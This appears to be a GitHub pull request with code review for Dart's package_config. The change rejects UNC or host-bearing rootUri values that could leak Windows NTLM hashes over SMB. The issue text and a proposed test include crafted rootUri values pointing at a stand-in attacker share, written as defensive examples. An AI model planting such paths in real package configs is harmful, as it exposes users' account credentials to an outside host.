issue.title: [package_config] Forbid UNC paths in rootUri to mitigate UNC path injection
issue.body_html:
On Windows a package_config.json, crafted by a malicious actor, can point to an external UNC network share (e.g. "rootUri": "//attacker.example.com/share/").

Downstream tools (analyzer, pub, etc) that attempt to read from such a path (or just File.statSync) may trigger Windows to initiate an SMB request which the attacker can use to record the user's account hashes.

To mitigate this issue, we require that rootUris inside package_config.json must be a local file path.

For users who legitimately have package_config.json on a network share, the solution is to mount these network shares as local drive letters (like Z:\).

BUG=536309083

issue.body:
On Windows a `package_config.json`, crafted by a malicious actor, can point to an external UNC network share (e.g. `"rootUri": "//attacker.example.com/share/"`). 

Downstream tools (`analyzer`, `pub`, etc) that attempt to read from such a path (or just `File.statSync`) may trigger Windows to initiate an SMB request which the attacker can use to [record the user's account hashes](https://attack.mitre.org/techniques/T1187/).

To mitigate this issue, we require that `rootUri`s inside `package_config.json` must be a local file path.

For users who legitimately have `package_config.json` on a network share, the solution is to mount these network shares as local drive letters (like `Z:\`).


BUG=536309083

timeline.body_html:
Code Review

This pull request mitigates UNC path injection (SMB NTLM leak) by forbidding non-local file paths in rootUri. Feedback on the changes highlights a regression where checking root.host.isNotEmpty instead of parsedRootUri.host.isNotEmpty breaks package resolution for legitimate projects hosted on network shares. Additionally, a temporary scratch file (scratch.dart) was committed and should be removed, and a test case should be added to verify that relative paths on network shares remain supported.

I am having trouble creating individual review comments. Click here to see my feedback.

pkgs/package_config/lib/src/package_config_json.dart (157-163)

Checking root.host.isNotEmpty will cause a regression for legitimate users who have their project located on a network share (UNC path). When baseLocation has a host (e.g., file://network-share/project/...), any relative rootUri (like ../foo) will resolve to a URI that inherits the same host. This causes root.host.isNotEmpty to be true, resulting in a false positive and breaking package resolution for those users.

To fix this, check parsedRootUri.host.isNotEmpty instead. This ensures that only rootUris that explicitly specify a host are rejected, while relative paths on a network share remain fully supported and secure.

    if (parsedRootUri.host.isNotEmpty) {
      onError(PackageConfigFormatException(
        'Package root URIs must not have a host (authority) component. '
        'The rootUri must be a local file path. '
        'Found: "${parsedRootUri.host}".', entry));
      return null;
    }
References
  1. When building foundational components, prioritize robust, future-proof implementations over simpler ones that may introduce subtle bugs or rely on unintended behavior.

pkgs/package_config/scratch.dart (1-6)

The scratch.dart file appears to be a temporary debug or scratch file used during development. It should not be committed to the repository. Please remove this file from the pull request.

pkgs/package_config/test/parse_test.dart (403-406)

Add a test case to verify that relative paths are still allowed when the project itself is located on a network share (i.e., when baseLocation has a host component). This prevents future regressions.

          testThrows(
            'has-host',
            '{$cfg,"packages":[{$name,"rootUri":"file://attacker.com/share/"}]}',
          );
          test('relative path on network share base', () {
            var config = parsePackageConfigBytes(
              utf8.encode('{$cfg,"packages":[{$name,"rootUri":"../foo/"}]}'),
              Uri.parse('file://network-share/tmp/.dart_tool/file.dart'),
              throwError,
            );
            expect(config.packages.first.root, Uri.parse('file://network-share/tmp/foo/'));
          });

pull.title: [package_config] Forbid UNC paths in rootUri to mitigate UNC path injection
pull.body:
On Windows a `package_config.json`, crafted by a malicious actor, can point to an external UNC network share (e.g. `"rootUri": "//attacker.example.com/share/"`). 

Downstream tools (`analyzer`, `pub`, etc) that attempt to read from such a path (or just `File.statSync`) may trigger Windows to initiate an SMB request which the attacker can use to [record the user's account hashes](https://attack.mitre.org/techniques/T1187/).

To mitigate this issue, we require that `rootUri`s inside `package_config.json` must be a local file path.

For users who legitimately have `package_config.json` on a network share, the solution is to mount these network shares as local drive letters (like `Z:\`).


BUG=536309083

review_comments.body:
What is the actual restriction here?

It's not a _windows_ restriction, it applies to all platforms, and it should be expressed in a way that can be understood without converting to a windows path.

A root URI that is a file URI must:
* Not have a non-empty authority part. 
* Not have a path that starts with `//`.

A `file:` URI always has an authority part, but it should be empty, meaning an empty host, a default/empty port and no user-id, so `.authority.isEmpty`.

Then it must not have a path that starts with `//`, because that will be converted to a Windows path starting with `\\`, so `!root.path.startsWith('//')`.

Aka: it must start with `file:///` and not be followed by `/`. It's probably a `_SimpleUri`, so doing `toString()` is free, so we can introduce a central check for that:
```dart
  bool hasSimpleFilePath(Uri uri) =>
    !uri.isScheme('file) ||
        uri.authority.isEmpty && !uri.path.startsWith('//');
```
and do;
```dart
  if (!fatalError && !hasSimpleFilePath(root)) {
    // Badness. 
    fatalError = true;
  }
```

(Do we need to check for  a path of `/%2f...` or `/%5c...`, the escapes for `/` and `\`? Doesn't seem so, they generate an "invalid character in path" error from `_toWindowsFilePath`.).

The URI must probably also not have an empty path, `file://` is a valid URI with an empty authority and empty path, but we already checked above that it `isAbsoluteDirectoryUri`, so that should be covered.

Need to check for port as well, don't want `file://:8192/path` to connect to something.

Also `file:///path` and `file://localhost/path` are morally equivalent.

Consider:
```dart
if (root.authority case var authority 
     when authority.isNotEmpty && authority != "localhost") {
  .... error ....
}
```

Should probably apply to package root (`lib/` dir) as well. Nothing here prevents that string from being `//example.com/badness/`.
(There should be a check later, that the package URI root is inside the package root, but let's not rely on that being enough. Security in depth.)

Should probably only apply if `.isScheme('file')`.

The current configuration allows non-`file` schemes.
If we shouldn't allow that, we should also check for it.
I think we should allow `../foo` relative paths, without `file:` prefix.
The `SimplePackage.validate` should validate all the constraints again. (Or instead, depends on whether it's a config parsing error or a data logic error.)

"must not evaluate to" -> "must not be" (the root URI is what it is - the representation is just a way to serialize it).

For someone not on Windows, that's a confusing error message. "That's _not_ a Windows UNC path, this is Unix. Also, what is a Windows UNC path?"
(Not that most Windows users would know that either.)

I'd start the text with the requirement, not the violation:
```dart
   "Package root URIs with the 'file:' scheme must be local paths, "
   "with no authority and a path not starting with '//'. "
   "Was: '$root` which has a non-trivial authority part.",
```

What is the actual restriction here?

It's not a _windows_ restriction, it applies to all platforms, and it should be expressed in a way that can be understood without converting to a windows path.

A root URI that is a file URI must:
* Not have a non-empty authority part. 
* Not have a path that starts with `//`.

A `file:` URI always has an authority part, but it should be empty, meaning an empty host, a default/empty port and no user-id, so `.authority.isEmpty`.

Then it must not have a path that starts with `//`, because that will be converted to a Windows path starting with `\\`, so `!root.path.startsWith('//')`.

Aka: it must start with `file:///` and not be followed by `/`. It's probably a `_SimpleUri`, so doing `toString()` is free, so we can introduce a central check for that:
```dart
  bool hasSimpleFilePath(Uri uri) =>
    !uri.isScheme('file) ||
        uri.authority.isEmpty && !uri.path.startsWith('//');
```
and do;
```dart
  if (!fatalError && !hasSimpleFilePath(root)) {
    // Badness. 
    fatalError = true;
  }
```

(Do we need to check for  a path of `/%2f...` or `/%5c...`, the escapes for `/` and `\`? Doesn't seem so, they generate an "invalid character in path" error from `_toWindowsFilePath`.).

The URI must probably also not have an empty path, `file://` is a valid URI with an empty authority and empty path, but we already checked above that it `isAbsoluteDirectoryUri`, so that should be covered.
